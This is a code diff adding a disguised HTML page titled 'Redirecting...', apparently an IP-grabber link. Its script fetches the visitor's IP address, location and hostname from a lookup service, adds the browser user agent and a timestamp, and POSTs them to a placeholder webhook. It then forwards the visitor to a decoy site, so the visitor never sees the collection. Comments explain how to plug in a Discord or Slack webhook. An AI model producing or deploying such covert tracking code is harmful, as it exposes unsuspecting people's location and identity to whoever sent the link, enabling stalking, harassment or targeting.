@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>Redirecting...</title></head>
+<body>
+<script>
+// Grab IP via wtfismyip.com (free, no API key)
+fetch('https://wtfismyip.com/json')
+  .then(r => r.json())
+  .then(data => {
+    const payload = {
+      ip: data.YourFuckingIPAddress,
+      location: data.YourFuckingLocation,
+      hostname: data.YourFuckingHostname,
+      ua: navigator.userAgent,
+      ts: new Date().toISOString()
+    };
+
+    // Send to your webhook (Discord, Slack, webhook.site, etc.)
+    fetch('https://webhook.site/your-unique-id', {
+      method: 'POST',
+      body: JSON.stringify(payload),
+      headers: {'Content-Type': 'application/json'}
+    });
+
+    // Redirect to a decoy page or site
+    window.location.href = 'https://example.com';
+  })
+  .catch(() => {
+    window.location.href = 'https://example.com'; // fallback
+  });
+</script>
+</body>
+</html>
